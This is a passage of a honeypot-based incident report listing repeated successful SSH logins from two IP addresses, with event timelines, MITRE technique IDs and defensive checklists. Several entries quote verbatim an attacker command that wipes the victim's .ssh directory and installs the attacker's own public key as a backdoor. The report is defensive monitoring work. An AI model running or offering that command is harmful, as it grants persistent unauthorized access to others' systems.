| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:32:48` | `cowrie.session.connect` |
| `2026-05-26 13:32:48` | `cowrie.client.version` |
| `2026-05-26 13:32:48` | `cowrie.client.kex` |
| `2026-05-26 13:32:48` | `cowrie.login.success` |
| `2026-05-26 13:32:49` | `cowrie.session.params` |
| `2026-05-26 13:32:49` | `cowrie.command.input` |
| `2026-05-26 13:32:49` | `cowrie.command.failed` |
| `2026-05-26 13:32:49` | `cowrie.log.closed` |
| `2026-05-26 13:32:49` | `cowrie.session.params` |
| `2026-05-26 13:32:49` | `cowrie.command.input` |
| `2026-05-26 13:32:49` | `cowrie.session.file_download` |
| `2026-05-26 13:32:49` | `cowrie.log.closed` |
| `2026-05-26 13:32:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.238[.]60` to AbuseIPDB if not already reported
- [ ] Block `118.145.238[.]60` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2243f0fd2b4e

| Field | Detail |
|---|---|
| **Source IP** | `118.145.238[.]60` |
| **First Seen** | 2026-05-26 13:32 |
| **Last Seen** | 2026-05-26 13:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:32:51` | `cowrie.session.connect` |
| `2026-05-26 13:32:51` | `cowrie.client.version` |
| `2026-05-26 13:32:51` | `cowrie.client.kex` |
| `2026-05-26 13:32:52` | `cowrie.login.success` |
| `2026-05-26 13:32:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.238[.]60` to AbuseIPDB if not already reported
- [ ] Block `118.145.238[.]60` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e7cbb1a936b

| Field | Detail |
|---|---|
| **Source IP** | `118.145.238[.]60` |
| **First Seen** | 2026-05-26 13:33 |
| **Last Seen** | 2026-05-26 13:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:33:38` | `cowrie.session.connect` |
| `2026-05-26 13:33:38` | `cowrie.client.version` |
| `2026-05-26 13:33:39` | `cowrie.client.kex` |
| `2026-05-26 13:33:39` | `cowrie.login.success` |
| `2026-05-26 13:33:39` | `cowrie.session.params` |
| `2026-05-26 13:33:39` | `cowrie.command.input` |
| `2026-05-26 13:33:39` | `cowrie.command.failed` |
| `2026-05-26 13:33:39` | `cowrie.log.closed` |
| `2026-05-26 13:33:40` | `cowrie.session.params` |
| `2026-05-26 13:33:40` | `cowrie.command.input` |
| `2026-05-26 13:33:40` | `cowrie.session.file_download` |
| `2026-05-26 13:33:40` | `cowrie.log.closed` |
| `2026-05-26 13:33:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.238[.]60` to AbuseIPDB if not already reported
- [ ] Block `118.145.238[.]60` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78d2d9725fb3

| Field | Detail |
|---|---|
| **Source IP** | `118.145.238[.]60` |
| **First Seen** | 2026-05-26 13:33 |
| **Last Seen** | 2026-05-26 13:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:33:42` | `cowrie.session.connect` |
| `2026-05-26 13:33:42` | `cowrie.client.version` |
| `2026-05-26 13:33:42` | `cowrie.client.kex` |
| `2026-05-26 13:33:42` | `cowrie.login.success` |
| `2026-05-26 13:33:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.238[.]60` to AbuseIPDB if not already reported
- [ ] Block `118.145.238[.]60` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2f55c9fc5c4

| Field | Detail |
|---|---|
| **Source IP** | `118.145.238[.]60` |
| **First Seen** | 2026-05-26 13:36 |
| **Last Seen** | 2026-05-26 13:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:36:00` | `cowrie.session.connect` |
| `2026-05-26 13:36:00` | `cowrie.client.version` |
| `2026-05-26 13:36:00` | `cowrie.client.kex` |
| `2026-05-26 13:36:01` | `cowrie.login.success` |
| `2026-05-26 13:36:01` | `cowrie.session.params` |
| `2026-05-26 13:36:01` | `cowrie.command.input` |
| `2026-05-26 13:36:01` | `cowrie.command.failed` |
| `2026-05-26 13:36:01` | `cowrie.log.closed` |
| `2026-05-26 13:36:01` | `cowrie.session.params` |
| `2026-05-26 13:36:01` | `cowrie.command.input` |
| `2026-05-26 13:36:02` | `cowrie.session.file_download` |
| `2026-05-26 13:36:02` | `cowrie.log.closed` |
| `2026-05-26 13:36:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.238[.]60` to AbuseIPDB if not already reported
- [ ] Block `118.145.238[.]60` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c41f1ffe0ce5

| Field | Detail |
|---|---|
| **Source IP** | `118.145.238[.]60` |
| **First Seen** | 2026-05-26 13:36 |
| **Last Seen** | 2026-05-26 13:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:36:03` | `cowrie.session.connect` |
| `2026-05-26 13:36:03` | `cowrie.client.version` |
| `2026-05-26 13:36:04` | `cowrie.client.kex` |
| `2026-05-26 13:36:04` | `cowrie.login.success` |
| `2026-05-26 13:36:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.238[.]60` to AbuseIPDB if not already reported
- [ ] Block `118.145.238[.]60` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b204d2ea56d

| Field | Detail |
|---|---|
| **Source IP** | `118.145.238[.]60` |
| **First Seen** | 2026-05-26 13:42 |
| **Last Seen** | 2026-05-26 13:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:42:31` | `cowrie.session.connect` |
| `2026-05-26 13:42:31` | `cowrie.client.version` |
| `2026-05-26 13:42:31` | `cowrie.client.kex` |
| `2026-05-26 13:42:31` | `cowrie.login.success` |
| `2026-05-26 13:42:32` | `cowrie.session.params` |
| `2026-05-26 13:42:32` | `cowrie.command.input` |
| `2026-05-26 13:42:32` | `cowrie.command.failed` |
| `2026-05-26 13:42:32` | `cowrie.log.closed` |
| `2026-05-26 13:42:32` | `cowrie.session.params` |
| `2026-05-26 13:42:32` | `cowrie.command.input` |
| `2026-05-26 13:42:32` | `cowrie.session.file_download` |
| `2026-05-26 13:42:32` | `cowrie.log.closed` |
| `2026-05-26 13:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.238[.]60` to AbuseIPDB if not already reported
- [ ] Block `118.145.238[.]60` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b4ee2718b6a

| Field | Detail |
|---|---|
| **Source IP** | `118.145.238[.]60` |
| **First Seen** | 2026-05-26 13:42 |
| **Last Seen** | 2026-05-26 13:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:42:34` | `cowrie.session.connect` |
| `2026-05-26 13:42:34` | `cowrie.client.version` |
| `2026-05-26 13:42:34` | `cowrie.client.kex` |
| `2026-05-26 13:42:35` | `cowrie.login.success` |
| `2026-05-26 13:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.238[.]60` to AbuseIPDB if not already reported
- [ ] Block `118.145.238[.]60` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a275ffec95c6

| Field | Detail |
|---|---|
| **Source IP** | `118.145.238[.]60` |
| **First Seen** | 2026-05-26 13:43 |
| **Last Seen** | 2026-05-26 13:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:43:21` | `cowrie.session.connect` |
| `2026-05-26 13:43:21` | `cowrie.client.version` |
| `2026-05-26 13:43:21` | `cowrie.client.kex` |
| `2026-05-26 13:43:22` | `cowrie.login.success` |
| `2026-05-26 13:43:22` | `cowrie.session.params` |
| `2026-05-26 13:43:22` | `cowrie.command.input` |
| `2026-05-26 13:43:22` | `cowrie.command.failed` |
| `2026-05-26 13:43:22` | `cowrie.log.closed` |
| `2026-05-26 13:43:22` | `cowrie.session.params` |
| `2026-05-26 13:43:22` | `cowrie.command.input` |
| `2026-05-26 13:43:22` | `cowrie.session.file_download` |
| `2026-05-26 13:43:22` | `cowrie.log.closed` |
| `2026-05-26 13:43:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.238[.]60` to AbuseIPDB if not already reported
- [ ] Block `118.145.238[.]60` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae5af3c326c2

| Field | Detail |
|---|---|
| **Source IP** | `118.145.238[.]60` |
| **First Seen** | 2026-05-26 13:43 |
| **Last Seen** | 2026-05-26 13:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:43:24` | `cowrie.session.connect` |
| `2026-05-26 13:43:24` | `cowrie.client.version` |
| `2026-05-26 13:43:24` | `cowrie.client.kex` |
| `2026-05-26 13:43:25` | `cowrie.login.success` |
| `2026-05-26 13:43:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.238[.]60` to AbuseIPDB if not already reported
- [ ] Block `118.145.238[.]60` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-641b69ef4db2

| Field | Detail |
|---|---|
| **Source IP** | `34.142.110[.]144` |
| **First Seen** | 2026-05-26 13:53 |
| **Last Seen** | 2026-05-26 13:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:53:16` | `cowrie.session.connect` |
| `2026-05-26 13:53:16` | `cowrie.client.version` |
| `2026-05-26 13:53:16` | `cowrie.client.kex` |
| `2026-05-26 13:53:17` | `cowrie.login.success` |
| `2026-05-26 13:53:18` | `cowrie.session.params` |
| `2026-05-26 13:53:18` | `cowrie.command.input` |
| `2026-05-26 13:53:18` | `cowrie.command.failed` |
| `2026-05-26 13:53:18` | `cowrie.log.closed` |
| `2026-05-26 13:53:19` | `cowrie.session.params` |
| `2026-05-26 13:53:19` | `cowrie.command.input` |
| `2026-05-26 13:53:19` | `cowrie.session.file_download` |
| `2026-05-26 13:53:19` | `cowrie.log.closed` |
| `2026-05-26 13:53:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.142.110[.]144` to AbuseIPDB if not already reported
- [ ] Block `34.142.110[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8df2b93b59a3

| Field | Detail |
|---|---|
| **Source IP** | `34.142.110[.]144` |
| **First Seen** | 2026-05-26 13:53 |
| **Last Seen** | 2026-05-26 13:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:53:22` | `cowrie.session.connect` |
| `2026-05-26 13:53:22` | `cowrie.client.version` |
| `2026-05-26 13:53:22` | `cowrie.client.kex` |
| `2026-05-26 13:53:23` | `cowrie.login.success` |
| `2026-05-26 13:53:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.142.110[.]144` to AbuseIPDB if not already reported
- [ ] Block `34.142.110[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63d93fa37015

| Field | Detail |
|---|---|
| **Source IP** | `34.142.110[.]144` |
| **First Seen** | 2026-05-26 13:53 |
| **Last Seen** | 2026-05-26 13:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:53:50` | `cowrie.session.connect` |
| `2026-05-26 13:53:50` | `cowrie.client.version` |
| `2026-05-26 13:53:51` | `cowrie.client.kex` |
| `2026-05-26 13:53:52` | `cowrie.login.success` |
| `2026-05-26 13:53:52` | `cowrie.session.params` |
| `2026-05-26 13:53:52` | `cowrie.command.input` |
| `2026-05-26 13:53:52` | `cowrie.command.failed` |
| `2026-05-26 13:53:52` | `cowrie.log.closed` |
| `2026-05-26 13:53:53` | `cowrie.session.params` |
| `2026-05-26 13:53:53` | `cowrie.command.input` |
| `2026-05-26 13:53:53` | `cowrie.session.file_download` |
| `2026-05-26 13:53:53` | `cowrie.log.closed` |
| `2026-05-26 13:53:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.142.110[.]144` to AbuseIPDB if not already reported
- [ ] Block `34.142.110[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb703bdd6a4b

| Field | Detail |
|---|---|
| **Source IP** | `34.142.110[.]144` |
| **First Seen** | 2026-05-26 13:53 |
| **Last Seen** | 2026-05-26 13:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:53:56` | `cowrie.session.connect` |
| `2026-05-26 13:53:56` | `cowrie.client.version` |
| `2026-05-26 13:53:56` | `cowrie.client.kex` |
| `2026-05-26 13:53:57` | `cowrie.login.success` |
| `2026-05-26 13:53:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.142.110[.]144` to AbuseIPDB if not already reported
- [ ] Block `34.142.110[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a138e2de0b2

| Field | Detail |
|---|---|
| **Source IP** | `34.142.110[.]144` |
| **First Seen** | 2026-05-26 13:54 |
| **Last Seen** | 2026-05-26 13:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:54:24` | `cowrie.session.connect` |
| `2026-05-26 13:54:24` | `cowrie.client.version` |
| `2026-05-26 13:54:24` | `cowrie.client.kex` |
| `2026-05-26 13:54:25` | `cowrie.login.success` |
| `2026-05-26 13:54:26` | `cowrie.session.params` |
| `2026-05-26 13:54:26` | `cowrie.command.input` |
| `2026-05-26 13:54:26` | `cowrie.command.failed` |
| `2026-05-26 13:54:26` | `cowrie.log.closed` |
| `2026-05-26 13:54:27` | `cowrie.session.params` |
| `2026-05-26 13:54:27` | `cowrie.command.input` |
| `2026-05-26 13:54:27` | `cowrie.session.file_download` |
| `2026-05-26 13:54:27` | `cowrie.log.closed` |
| `2026-05-26 13:54:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.142.110[.]144` to AbuseIPDB if not already reported
- [ ] Block `34.142.110[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-880cd642f682

| Field | Detail |
|---|---|
| **Source IP** | `34.142.110[.]144` |
| **First Seen** | 2026-05-26 13:54 |
| **Last Seen** | 2026-05-26 13:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:54:30` | `cowrie.session.connect` |
| `2026-05-26 13:54:30` | `cowrie.client.version` |
| `2026-05-26 13:54:30` | `cowrie.client.kex` |
| `2026-05-26 13:54:31` | `cowrie.login.success` |
| `2026-05-26 13:54:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.142.110[.]144` to AbuseIPDB if not already reported
- [ ] Block `34.142.110[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c101f08ab26

| Field | Detail |
|---|---|
| **Source IP** | `34.142.110[.]144` |
| **First Seen** | 2026-05-26 13:54 |
| **Last Seen** | 2026-05-26 13:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:54:56` | `cowrie.session.connect` |
| `2026-05-26 13:54:56` | `cowrie.client.version` |
| `2026-05-26 13:54:56` | `cowrie.client.kex` |
| `2026-05-26 13:54:57` | `cowrie.login.success` |
| `2026-05-26 13:54:58` | `cowrie.session.params` |
